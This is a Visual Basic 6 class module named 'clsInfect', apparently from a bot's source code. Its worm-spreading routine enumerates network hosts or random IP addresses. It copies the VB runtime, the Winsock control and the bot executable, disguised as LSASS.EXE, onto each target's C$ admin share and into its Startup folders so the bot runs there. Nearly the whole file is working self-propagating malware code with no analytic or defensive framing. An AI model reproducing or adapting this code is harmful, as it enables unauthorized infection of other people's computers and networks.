VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
  Persistable = 0  'NotPersistable
  DataBindingBehavior = 0  'vbNone
  DataSourceBehavior  = 0  'vbNone
  MTSTransactionMode  = 0  'NotAnMTSObject
END
Attribute VB_Name = "clsInfect"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = True
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Option Explicit

Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (hpvDest As Any, ByVal hpvSource As Long, ByVal cbCopy As Long)
Private Declare Function NetServerEnum Lib "netapi32.dll" (ByVal servername As String, ByVal level As Long, BUFFER As Long, ByVal prefmaxlen As Long, entriesread As Long, totalentries As Long, ByVal ServerType As Long, ByVal domain As String, resumehandle As Long) As Long
Private Declare Function NetApiBufferFree Lib "netapi32.dll" (BufPtr As Any) As Long
Private Declare Function lstrcpy Lib "kernel32" Alias "lstrcpyW" (ByVal lpszDest As String, ByVal lpszSrc As Long) As Long

Private Const ERROR_SUCCESS = 0
Private Const ERROR_MORE_DATA = 234
Private Const SIZE_SI_101 = 24

Private Type SERVER_INFO_101
   dwPlatformId As Long
   lpszServerName As Long
   dwVersionMajor As Long
   dwVersionMinor As Long
   dwType As Long
   lpszComment As Long
End Type

Private InternalInfect As Integer

Public Function NetBIOS() As Long
    On Error GoTo ErrTrap
    Dim lRet As Long, sArray() As String, nK As Integer, sIP As String
    frmMain.TimerProc.Enabled = False
    If GetServerList(SV_TYPE_ALL) <> "" And InternalInfect% = 0 Then
        sArray() = Split(GetServerList(SV_TYPE_ALL), ",")
        For nK% = 0 To UBound(sArray())
            DoEvents
            '/* vb interpreter */
            Call System.BlockCopy(System.WinDir & "\msvbvm60.dll", "\\" & Trim$(sArray(nK%)) & "\C$\WINDOWS\msvbvm60.dll")
            Call System.BlockCopy(System.WinDir & "\msvbvm60.dll", "\\" & Trim$(sArray(nK%)) & "\C$\WINNT\msvbvm60.dll")
            DoEvents
            '/* winsock control */
            Call System.BlockCopy(System.WinDir & "\mswinsck.ocx", "\\" & Trim$(sArray(nK%)) & "\C$\WINDOWS\mswinsck.ocx")
            Call System.BlockCopy(System.WinDir & "\mswinsck.ocx", "\\" & Trim$(sArray(nK%)) & "\C$\WINNT\mswinsck.ocx")
            DoEvents
            '/* worm */
            Call System.BlockCopy(Bot.Location, "\\" & Trim$(sArray(nK%)) & "\C$\WINDOWS\Start Menu\Programs\StartUp\LSASS.EXE") '/* Win9x\ME */
            Call System.BlockCopy(Bot.Location, "\\" & Trim$(sArray(nK%)) & "\C$\Documents And Settings\All Users\Start Menu\Programs\StartUp\LSASS.EXE") '/* Win2k\XP */
            Call System.BlockCopy(Bot.Location, "\\" & Trim$(sArray(nK%)) & "\C$\WINNT\Profiles\All Users\Start Menu\Programs\StartUp\LSASS.EXE") '/* WinNT */
        Next nK%
        NetBIOS& = -1
        InternalInfect% = 1
    Else
        sIP$ = GenerateIP$
        DoEvents
        '/* vb interpreter */
        lRet& = System.BlockCopy(System.WinDir & "\msvbvm60.dll", "\\" & sIP$ & "\C$\WINDOWS\msvbvm60.dll"): If lRet& = 1 Then NetBIOS& = 1
        lRet& = System.BlockCopy(System.WinDir & "\msvbvm60.dll", "\\" & sIP$ & "\C$\WINNT\msvbvm60.dll"): If lRet& = 1 Then NetBIOS& = 1
        DoEvents
        '/* winsock control */
        lRet& = System.BlockCopy(System.WinDir & "\mswinsck.ocx", "\\" & sIP$ & "\C$\WINDOWS\mswinsck.ocx"): If lRet& = 1 Then NetBIOS& = 1
        lRet& = System.BlockCopy(System.WinDir & "\mswinsck.ocx", "\\" & sIP$ & "\C$\WINNT\mswinsck.ocx"): If lRet& = 1 Then NetBIOS& = 1
        DoEvents
        '/* worm */
        lRet& = System.BlockCopy(Bot.Location, "\\" & sIP$ & "\C$\WINDOWS\Start Menu\Programs\StartUp\LSASS.EXE"): If lRet& = 1 Then NetBIOS& = 1 '/* Win9x\ME */
        lRet& = System.BlockCopy(Bot.Location, "\\" & sIP$ & "\C$\Documents And Settings\All Users\Start Menu\Programs\StartUp\LSASS.EXE"): If lRet& = 1 Then NetBIOS& = 1 '/* Win2k\XP */
        lRet& = System.BlockCopy(Bot.Location, "\\" & sIP$ & "\C$\WINNT\Profiles\All Users\Start Menu\Programs\StartUp\LSASS.EXE"): If lRet& = 1 Then NetBIOS& = 1 '/* WinNT */
    End If
    frmMain.TimerProc.Enabled = True
Exit Function
ErrTrap:
    NetBIOS& = 0
    frmMain.TimerProc.Enabled = True
End Function

Private Function GenerateIP() As String
    On Error Resume Next
    Dim nA As Integer, nB As Integer, nC As Integer, nD As Integer
    Randomize
    nA% = Fix((Rnd * 254) + 1)
    Randomize
    nB% = Fix((Rnd * 254) + 1)
    Randomize
    nC% = Fix((Rnd * 254) + 1)
    Randomize
    nD% = Fix((Rnd * 254) + 1)
    GenerateIP$ = CStr(nA%) & "." & CStr(nB%) & "." & CStr(nC%) & "." & CStr(nD%)
End Function

Private Function GetServerList(ServerType As ServerTypes) As String
    On Error GoTo ErrTrap
    Dim pszTemp As String, pszServer As String, pszDomain As String
    Dim nLevel As Long, i As Long, BufPtr As Long, TempBufPtr As Long
    Dim nPrefMaxLen As Long, nEntriesRead As Long, nTotalEntries As Long
    Dim nServerType As Long, nResumeHandle As Long, nRes As Long
    Dim ServerInfo As SERVER_INFO_101, ServerNames() As String, nK As Integer
    Dim sTemp As String
    ReDim ServerNames(0) As String
    pszServer = vbNullString
    pszDomain = vbNullString
    nLevel = 101
    BufPtr = 0
    nPrefMaxLen = &HFFFFFFFF
    nEntriesRead = 0
    nTotalEntries = 0
    nServerType = ServerType
    nResumeHandle = 0
    Do
        nRes = NetServerEnum(pszServer, nLevel, BufPtr, nPrefMaxLen, nEntriesRead, nTotalEntries, nServerType, pszDomain, nResumeHandle)
        If ((nRes = ERROR_SUCCESS) Or (nRes = ERROR_MORE_DATA)) And (nEntriesRead > 0) Then
            TempBufPtr = BufPtr
            For i = 1 To nEntriesRead
                Call CopyMemory(ServerInfo, TempBufPtr, SIZE_SI_101)
                ReDim Preserve ServerNames(UBound(ServerNames()) + 1) As String
                ServerNames(UBound(ServerNames())) = PointerToString(ServerInfo.lpszServerName)
                TempBufPtr = TempBufPtr + SIZE_SI_101
            Next i
        Else
            GetServerList$ = vbNullString
            Exit Function
        End If
        Call NetApiBufferFree(BufPtr)
    Loop While nEntriesRead < nTotalEntries
    sTemp$ = ""
    For nK% = 0 To UBound(ServerNames())
        If Len(Trim$(Replace$(ServerNames(nK%), Chr$(0), ""))) > 0 Then sTemp$ = sTemp$ & ServerNames(nK%) & ", "
    Next nK%
    If Right$(sTemp$, 2) = ", " Then sTemp$ = Left$(sTemp$, Len(sTemp$) - 2)
    GetServerList$ = sTemp$
Exit Function
ErrTrap:
    GetServerList$ = vbNullString
End Function

Private Function PointerToString(lpszString As Long) As String
    Dim lpszStr1 As String, lpszStr2 As String, nRes As Long
    lpszStr1 = String(1000, "*")
    nRes = lstrcpy(lpszStr1, lpszString)
    lpszStr2 = (StrConv(lpszStr1, vbFromUnicode))
    PointerToString = Left(lpszStr2, InStr(lpszStr2, Chr$(0)) - 1)
End Function
